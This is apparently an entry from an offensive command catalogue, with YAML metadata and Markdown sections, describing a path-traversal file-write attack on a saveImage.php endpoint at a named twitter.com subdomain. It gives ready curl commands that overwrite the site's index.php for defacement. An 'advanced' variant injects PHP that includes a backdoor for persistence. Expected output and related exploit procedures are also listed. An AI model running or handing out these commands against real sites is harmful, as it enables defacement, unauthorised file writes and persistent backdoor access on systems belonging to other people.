---
data: >-
  curl -X POST https://reverb.twitter.com/api/actions/saveImage.php -d
  "image=<malicious_data>&filename=../../../../index.php&extension=php"
tags:
  - defacement
  - traversal
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:08.035Z'
id: 20a2e867-07be-47d8-a483-180d5aacc3cb
verified: false
validated: true
submitted: true
---
# saveimage-defacement-index

## Command

```bash
curl -X POST https://reverb.twitter.com/api/actions/saveImage.php -d "image=<malicious_data>&filename=../../../../index.php&extension=php"
```

## Description

Uses traversal to overwrite the site's index.php with attacker-controlled content for defacement.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| image | Malicious content (e.g., defacement HTML/PHP) | Yes |
| filename | Traversal to root (e.g., ../../../../index.php) | Yes |
| extension | .php | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://reverb.twitter.com/api/actions/saveImage.php -d "image=<h1>Hacked</h1>&filename=../../../../index.php&extension=php"
```

### Advanced Usage

Include PHP for persistence:

```bash
curl -X POST https://reverb.twitter.com/api/actions/saveImage.php -d "image=<?php include 'backdoor.php'; ?>&filename=../../../../index.php&extension=php"
```

## Expected Output

Index.php overwritten; site shows attacker content upon access to https://reverb.twitter.com/.

## Related

- [[commands/saveimage-traversal-php]]
- [[procedures/Exploit-Directory-Traversal-for-Arbitrary-File-Write]]
